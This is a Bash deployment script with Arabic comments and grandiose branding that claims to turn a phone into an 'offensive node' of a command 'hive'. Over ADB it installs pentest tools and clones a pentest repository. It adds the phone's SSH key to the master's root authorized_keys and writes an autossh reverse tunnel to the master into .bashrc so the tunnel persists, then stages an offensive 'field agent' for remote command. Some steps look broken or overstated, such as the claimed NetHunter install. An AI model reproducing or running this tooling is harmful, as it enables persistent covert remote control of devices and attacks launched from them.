
#!/bin/bash
# =====================================================================
# muizz_mobile_deploy.sh — محرك نشر السيادة المتنقلة v2.0
# Al-Mu'izz (المُعِزّ) – تحويل الهاتف إلى عقدة هجومية في العقل الجمعي
# (c) 2025 Sovereign Systems - Al-Ghazali Root
# =====================================================================
set -euo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'
PURPLE='\033[0;35m'; CYAN='\033[0;36m'; NC='\033[0m'

info() { echo -e "${BLUE}[*]${NC} $1"; }
success() { echo -e "${GREEN}[✓]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
attack() { echo -e "${PURPLE}[⚔]${NC} $1"; }

INSTALL_DIR="/opt/sovereign-ai-platform"
MASTER_IP=$(hostname -I | awk '{print $1}')
SSH_PORT="22"

clear
echo -e "${PURPLE}   🦅 AL-MUIZZ MOBILE OVERMIND DEPLOYMENT v2.0${NC}"
echo -e "${CYAN}   [ COMMANDER: AL-GHAZALI ROOT | HIVE v43.0 ]${NC}\n"

if [[ $EUID -ne 0 ]]; then
   warn "يرجى التشغيل بصلاحيات root لضمان إعداد الأنفاق والخدمات."
   exit 1
fi

# 1. فحص الاتصال بالأجهزة عبر ADB
check_adb() {
    info "البحث عن أجهزة مستهدفة عبر ADB..."
    DEVICES=$(adb devices | grep -v "List" | grep "device" | wc -l)
    if [ "$DEVICES" -eq 0 ]; then
        warn "لم يتم العثور على أجهزة متصلة. يرجى تفعيل USB Debugging."
        return 1
    fi
    success "تم رصد $DEVICES أجهزة جاهزة للالتحام."
    return 0
}

# 2. حقن Kali NetHunter و EliteHex
deploy_payloads() {
    attack "جاري حقن ذكاء المُعِزّ في الهاتف..."
    # إرسال سكريبت التثبيت التلقائي للهاتف
    cat > /tmp/phone_setup.sh << 'EOF'
pkg update && pkg upgrade -y
pkg install wget python git nmap openssh autossh -y
pip install requests beautifulsoup4 python-nmap
git clone https://github.com/BluHExH/Hex-pentest ~/elitehex
# إعداد الدخول التلقائي
mkdir -p ~/.ssh
EOF
    adb push /tmp/phone_setup.sh /data/data/com.termux/files/home/
    adb shell "chmod +x ~/phone_setup.sh && ./phone_setup.sh"
    success "تم تثبيت الترسانة الهجومية (NetHunter + EliteHex) على الهاتف."
}

# 3. إعداد النفق العكسي السيادي (Reverse Overmind Tunnel)
setup_tunnel() {
    info "إعداد نفق التشابك الكمي (Reverse SSH Tunnel)..."
    # توليد مفاتيح SSH للهاتف إذا لم تكن موجودة
    adb shell "ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -N ''"
    # جلب المفتاح العام لإضافته للخادم الرئيسي لضمان الدخول بدون كلمة سر
    PUB_KEY=$(adb shell "cat ~/.ssh/id_ed25519.pub")
    echo "$PUB_KEY" >> /root/.ssh/authorized_keys
    
    # إعداد تشغيل النفق تلقائياً على الهاتف
    adb shell "echo 'autossh -M 0 -f -N -R 9999:localhost:9999 -R 5901:localhost:5901 root@$MASTER_IP' >> ~/.bashrc"
    success "نفق التشابك الكمي جاهز. الهاتف الآن عقدة تابعة للعرش."
}

# 4. تشغيل الوكيل الميداني المحمول
activate_mobile_agent() {
    info "تنشيط الوكيل الميداني في العصب المركزي..."
    mkdir -p "$INSTALL_DIR/field-agent"
    cp "$INSTALL_DIR/ai-engine/offensive/mobile_agent.py" "$INSTALL_DIR/field-agent/"
    chmod +x "$INSTALL_DIR/field-agent/mobile_agent.py"
    success "الوكيل الميداني نشط وجاهز لاستقبال الأوامر من العقل الأسمى."
}

# التنفيذ
if check_adb; then
    deploy_payloads
    setup_tunnel
    activate_mobile_agent
    echo -e "\n${GREEN}================================================${NC}"
    echo -e "${GREEN}   ✅ تم ربط الهاتف بنجاح بعقل المُعِزّ v43.0     ${NC}"
    echo -e "${GREEN}   [ STATUS: MOBILE_NODE_LINKED ]               ${NC}"
    echo -e "${GREEN}================================================${NC}"
    echo -e "يمكنك الآن التحكم بالهاتف عبر 'Divine Strike' في العرش."
fi
